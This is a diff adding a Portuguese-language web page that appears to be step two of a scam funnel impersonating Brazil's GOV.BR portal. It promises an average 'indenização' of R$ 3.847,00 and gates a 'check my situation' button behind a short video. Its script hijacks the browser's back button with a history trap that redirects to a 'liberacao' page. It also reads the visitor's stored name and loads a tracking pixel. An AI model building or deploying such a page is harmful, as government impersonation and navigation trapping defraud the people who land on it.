@@ -1,0 +1,362 @@
+<!DOCTYPE html><html lang="en"><head>
+   <script src="js/Mm27xNPtJXsR.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.pixelId = "66d288147745dede27dc2965";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta content="text/html; charset=UTF-8; X-Content-Type-Options=nosniff" http-equiv="Content-Type">
+    <title>Consulta - educacional -4</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        'poppins': ['Poppins', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <!-- fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        @keyframes pulse-scale {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+        }
+        .animate-pulse-scale {
+            animation: pulse-scale 1s ease-in-out infinite;
+        }
+
+        /* Custom Video Player Styles */
+        .video-container {
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .video-container video {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .play-pause-btn {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70px;
+            height: 70px;
+            background: rgba(255, 255, 255, 0.95);
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            z-index: 10;
+        }
+
+        .play-pause-btn:hover {
+            transform: translate(-50%, -50%) scale(1.1);
+            background: rgba(255, 255, 255, 1);
+            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.4);
+        }
+
+        .play-pause-btn:active {
+            transform: translate(-50%, -50%) scale(0.95);
+        }
+
+        .play-pause-btn.playing {
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .play-pause-btn.show-controls {
+            opacity: 0.9;
+            pointer-events: auto;
+        }
+
+        .video-container {
+            cursor: pointer;
+        }
+
+        .play-icon,
+        .pause-icon {
+            width: 30px;
+            height: 30px;
+            fill: #2563eb;
+        }
+
+        .pause-icon {
+            display: none;
+        }
+
+        .play-pause-btn.playing .play-icon {
+            display: none;
+        }
+
+        .play-pause-btn.playing .pause-icon {
+            display: block;
+        }
+    </style>
+</head>
+<body class="w-full overflow-x-hidden font-poppins">
+
+<div class="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50">
+    <header class="fixed top-0 left-0 right-0 z-50 bg-white/95 backdrop-blur-sm shadow-sm border-b border-gray-200">
+        <div class="px-4 py-2">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-3">
+                    <img alt="Logo GOV.BR" class="h-6 w-auto" src="images/l2T22yDxNAjx.png">
+                    <div class="hidden sm:block h-5 w-px bg-gray-300"></div>
+                    <span class="hidden sm:inline text-xs font-medium text-gray-600">Portal Oficial</span>
+                </div>
+                <div class="flex items-center space-x-3">
+                    <div class="flex items-center space-x-1 text-xs text-gray-500">
+                        <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+                        <span class="hidden sm:inline">Seguro</span>
+                    </div>
+                    <button class="flex items-center space-x-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-full transition-colors text-sm">
+                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path></svg>
+                        <span class="font-medium" id="nameHeader"></span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="h-8"></div>
+    
+    <main class="pt-10 pb-8 px-4">
+        <div class="max-w-md mx-auto">
+            <div class="mb-6">
+                <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+                    <span class="font-medium">Educação</span>
+                    <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">2 de 6</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+                    <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 33.3333%;"></div>
+                </div>
+                <p class="text-xs text-gray-500 text-center">Entenda seus direitos</p>
+            </div>
+            <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+                <div class="bg-gradient-to-r from-blue-600 to-blue-700 text-white p-3 sm:p-4 text-center">
+                    <div class="flex items-center justify-center space-x-2 mb-2">
+                        <svg fill="currentColor" viewBox="0 0 20 20" class="w-4 h-4 sm:w-5 sm:h-5"><path d="M2 6a2 2 0 012-2h6l2 2h6a2 2 0 012 2v6a2 2 0 01-2 2H4a2 2 0 01-2-2V6z"></path></svg>
+                        <span class="font-bold text-xs sm:text-sm">ENTENDA SEUS DIREITOS</span>
+                    </div>
+                    <p class="text-xs opacity-90">Assista ao vídeo para entender melhor</p>
+                </div>
+                <div class="p-4 sm:p-6">
+                    <div class="text-center mb-4 sm:mb-6">
+                        <h2 class="text-lg sm:text-xl font-bold text-gray-900 mb-2">
+                            Indenização: Seu por Direito
+                        </h2>
+                        <p class="text-gray-600 text-sm">
+                            Assista ao vídeo explicativo de 
+                            <strong>35 segundos</strong> para entender 
+                            seus direitos
+                        </p>
+                    </div>
+                    
+                    <!-- Custom Video Player -->
+                    <div class="mb-4 sm:mb-6">
+                        <div class="video-container">
+                            <video id="customVideo" preload="metadata" playsinline="">
+                                <source src="media/BMOO4P3Sr9wZ.mp4" type="video/mp4">
+                                Seu navegador não suporta a tag de vídeo.
+                            </video>
+                            <button class="play-pause-btn" id="playPauseBtn" aria-label="Play/Pause">
+                                <svg class="play-icon" viewBox="0 0 24 24">
+                                    <path d="M8 5v14l11-7z"></path>
+                                </svg>
+                                <svg class="pause-icon" viewBox="0 0 24 24">
+                                    <path d="M6 4h4v16H6V4zm8 0h4v16h-4V4z"></path>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="grid grid-cols-1 gap-4 mb-4 sm:mb-6">
+                        <div class="bg-green-50 border border-green-200 rounded-xl p-3 sm:p-4">
+                            <div class="flex items-center space-x-3">
+                                <div class="w-8 h-8 sm:w-10 sm:h-10 bg-green-100 rounded-full flex items-center justify-center">
+                                    <svg fill="currentColor" viewBox="0 0 20 20" class="w-4 h-4 sm:w-5 sm:h-5 text-green-600"><path d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z"></path></svg>
+                                </div>
+                                <div>
+                                    <h4 class="font-bold text-green-800 text-sm">Valor Médio Resgatado</h4>
+                                    <div class="text-lg sm:text-xl font-bold text-green-600">R$ 3.847,00</div>
+                                    <p class="text-green-700 text-xs">Por pessoa em 2024</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="space-y-3" id="watchingVideo">
+                        <div class="bg-amber-50 border border-amber-200 rounded-xl p-4 text-center">
+                            <div class="flex items-center justify-center space-x-2 text-amber-700">
+                                <svg fill="none" viewBox="0 0 24 24" class="w-5 h-5 animate-spin">
+                                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" class="opacity-25"></circle>
+                                    <path fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" class="opacity-75"></path>
+                                </svg>
+                                <span class="text-sm font-medium">Assista ao vídeo para continuar</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <a href="../parte%205/index.html" id="button4" class="hidden w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-3 sm:py-4 px-4 sm:px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center space-x-2 touch-target">
+                        <span>VERIFICAR MINHA SITUAÇÃO</span>
+                        <svg fill="currentColor" viewBox="0 0 20 20" class="w-4 h-4 sm:w-5 sm:h-5"><path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </main>
+</div>
+
+<script>
+    // ===== BACK REDIRECT =====
+(function() {
+    const redirectUrl = 'liberacao.html';
+    let redirected = false;
+
+    function buildRedirectUrl() {
+        const queryString = window.location.search;
+        return queryString ? redirectUrl + queryString : redirectUrl;
+    }
+
+    // Substitui o estado atual e empurra um novo em cima
+    history.replaceState({ page: 'trap' }, '', window.location.href);
+    history.pushState({ page: 'current' }, '', window.location.href);
+
+    window.addEventListener('popstate', function(event) {
+        if (!redirected) {
+            redirected = true;
+            window.location.replace(buildRedirectUrl());
+        }
+    });
+
+    window.addEventListener('pageshow', function(event) {
+        if (event.persisted && !redirected) {
+            redirected = true;
+            window.location.replace(buildRedirectUrl());
+        }
+    });
+})();
+// ===== FIM BACK REDIRECT =====
+    // Name header
+    const nameValue = localStorage.getItem("name") || "";
+    const formattedName = nameValue.split(" ")[0];
+    const nameHeader = document.getElementById("nameHeader");
+    if (nameHeader) {
+        nameHeader.textContent = formattedName;
+    }
+
+    // Wait for DOM to be fully loaded
+    document.addEventListener('DOMContentLoaded', function() {
+        // Custom Video Player
+        const video = document.getElementById('customVideo');
+        const playPauseBtn = document.getElementById('playPauseBtn');
+        const videoContainer = document.querySelector('.video-container');
+        const button4 = document.getElementById('button4');
+        const watchingVideo = document.getElementById('watchingVideo');
+
+        if (!video || !playPauseBtn || !videoContainer) {
+            console.error('Video elements not found');
+            return;
+        }
+
+        let hasPlayedOnce = false;
+
+        // Handle video errors
+        video.addEventListener('error', function(e) {
+            console.error('Video error:', e);
+            alert('Erro ao carregar o vídeo. Verifique se o arquivo existe em: media/BMOO4P3Sr9wZ.mp4');
+        });
+
+        // Play/Pause functionality on button click
+        playPauseBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            if (video.paused) {
+                video.play().catch(function(error) {
+                    console.error('Play error:', error);
+                });
+            } else {
+                video.pause();
+            }
+        });
+
+        // Click on video container to toggle controls
+        videoContainer.addEventListener('click', function(e) {
+            // Don't trigger if clicking the button itself
+            if (e.target === playPauseBtn || playPauseBtn.contains(e.target)) {
+                return;
+            }
+
+            // If video is playing and controls are hidden, show them
+            if (!video.paused && !playPauseBtn.classList.contains('show-controls')) {
+                playPauseBtn.classList.add('show-controls');
+                // Hide controls after 2 seconds
+                setTimeout(function() {
+                    playPauseBtn.classList.remove('show-controls');
+                }, 2000);
+            }
+        });
+
+        // When video starts playing
+        video.addEventListener('play', function() {
+            hasPlayedOnce = true;
+            playPauseBtn.classList.add('playing');
+            playPauseBtn.classList.remove('show-controls');
+        });
+
+        // When video pauses
+        video.addEventListener('pause', function() {
+            // Always show button when paused
+            playPauseBtn.classList.remove('playing');
+            playPauseBtn.classList.remove('show-controls');
+        });
+
+        // Show continue button after video ends
+        video.addEventListener('ended', function() {
+            if (button4) button4.classList.remove('hidden'); 
+            if (watchingVideo) watchingVideo.classList.add('hidden');
+        });
+
+        // Show continue button after 38 seconds
+        setTimeout(function() {
+            if (button4) button4.classList.remove('hidden'); 
+            if (watchingVideo) watchingVideo.classList.add('hidden');
+        }, 38000);
+    });
+</script>
+
+</body></html>
